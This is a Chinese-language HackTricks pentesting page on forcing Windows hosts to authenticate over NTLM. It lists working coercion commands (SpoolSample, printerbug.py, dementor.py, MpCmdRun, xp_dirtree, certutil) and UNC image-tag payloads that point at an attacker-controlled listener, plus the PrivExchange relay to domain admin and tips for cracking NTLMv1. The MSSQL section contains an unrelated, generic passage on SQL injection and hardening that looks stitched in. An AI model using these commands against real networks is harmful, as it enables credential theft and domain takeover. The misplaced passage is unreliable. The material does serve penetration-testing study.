# 强制使用NTLM特权身份验证

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)是一个使用MIDL编译器编写的C#代码的**远程身份验证触发器集合**，用于避免第三方依赖。

## Spooler服务滥用

如果启用了_**打印池**_服务，您可以使用一些已知的AD凭据向域控制器的打印服务器**请求**更新新的打印作业，并告诉它**将通知发送到某个系统**。\
请注意，当打印机向任意系统发送通知时，它需要对该系统进行**身份验证**。因此，攻击者可以使_**打印池**_服务对任意系统进行身份验证，并且该服务将在此身份验证中使用计算机帐户。

### 在域上查找Windows服务器

使用PowerShell获取Windows服务器列表。通常情况下，服务器是优先级较高的，所以我们将重点关注这些服务器：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 寻找正在监听的打印池服务

使用稍作修改的 @mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看打印池服务是否正在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
您还可以在Linux上使用rpcdump.py，并查找MS-RPRN协议。
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 请求服务对任意主机进行身份验证

您可以从[这里](https://github.com/NotMedic/NetNTLMtoSilverTicket)编译**SpoolSample**。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者在Linux上使用[**3xocyte的dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)或[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)。
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 结合无限制委派

如果攻击者已经入侵了具有[无限制委派](unconstrained-delegation.md)的计算机，攻击者可以**使打印机对该计算机进行身份验证**。由于存在无限制委派，**打印机的计算机帐户的TGT将保存在**具有无限制委派的计算机的**内存**中。由于攻击者已经入侵了该主机，他将能够**检索此票证**并滥用它（[传递票证](pass-the-ticket.md)）。

## RCP强制身份验证

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻击是由于Exchange Server的`PushSubscription`功能中的一个缺陷导致的，该功能允许**任何具有邮箱的域用户强制Exchange服务器对客户端提供的任何主机进行身份验证**。

Exchange服务以**SYSTEM**身份运行，并且默认情况下**权限过高**（即，在2019年累积更新之前具有对域的WriteDacl权限）。可以利用此缺陷来**中继到LDAP并转储域NTDS数据库**。如果无法中继到LDAP，则可以利用此缺陷中继和对域内的**其他主机进行身份验证**。此攻击将使您可以使用任何经过身份验证的域用户帐户直接访问域管理员。

****[**此技术的来源在此。**](https://academy.hackthebox.com/module/143/section/1276)****

## 在Windows内部

如果您已经在Windows机器内部，可以使用特权帐户强制Windows连接到服务器，方法如下：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL（Microsoft SQL Server）是一种关系型数据库管理系统，常用于存储和管理大量数据。它是由微软开发的，广泛应用于企业和组织的数据管理中。

MSSQL具有强大的功能和安全性，但在配置不当的情况下，可能会存在安全漏洞。黑客可以利用这些漏洞来获取未经授权的访问权限，并对数据库进行恶意操作。

以下是一些常见的MSSQL攻击技术：

1. **SQL注入攻击**：黑客通过在应用程序的输入字段中插入恶意SQL代码，来执行未经授权的数据库操作。这可以导致数据泄露、数据篡改或拒绝服务攻击。

2. **弱密码攻击**：黑客使用暴力破解或字典攻击等方法，尝试猜解MSSQL数据库的管理员密码。如果管理员使用弱密码，黑客可以轻松获取对数据库的完全控制权。

3. **未经授权的访问**：黑客可以通过利用MSSQL服务器上的安全漏洞，绕过身份验证机制，获取对数据库的未经授权访问权限。这可能导致数据泄露、数据篡改或拒绝服务攻击。

为了保护MSSQL数据库免受攻击，以下是一些建议的安全措施：

1. **更新和修补**：定期更新和修补MSSQL服务器，以确保安装了最新的安全补丁和修复程序。

2. **强密码策略**：使用强密码，并定期更改密码。避免使用常见的密码，如生日、姓名或简单的数字序列。

3. **访问控制**：限制对MSSQL服务器的访问权限，并仅授权给需要访问数据库的用户。

4. **安全审计**：启用MSSQL服务器的安全审计功能，以便监控和记录对数据库的访问和操作。

5. **网络安全**：使用防火墙和入侵检测系统来保护MSSQL服务器免受网络攻击。

通过采取这些安全措施，可以大大减少MSSQL数据库受到攻击的风险，并保护组织的数据安全。
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
或者使用另一种技术：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用certutil.exe（Microsoft签名的二进制文件）来强制执行NTLM身份验证：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML注入

### 通过电子邮件

如果你知道你想入侵的机器上登录用户的**电子邮件地址**，你可以发送一封带有一个1x1像素的**图片的电子邮件**，例如：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

如果你能对一台计算机进行中间人攻击，并在他可视化的页面中注入HTML，你可以尝试在页面中注入如下图像：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 破解NTLMv1

如果你能够捕获到[NTLMv1的挑战，请阅读这里如何破解它们](../ntlm/#ntlmv1-attack)。\
_请记住，为了破解NTLMv1，你需要将Responder的挑战设置为"1122334455667788"_。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks的衍生品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
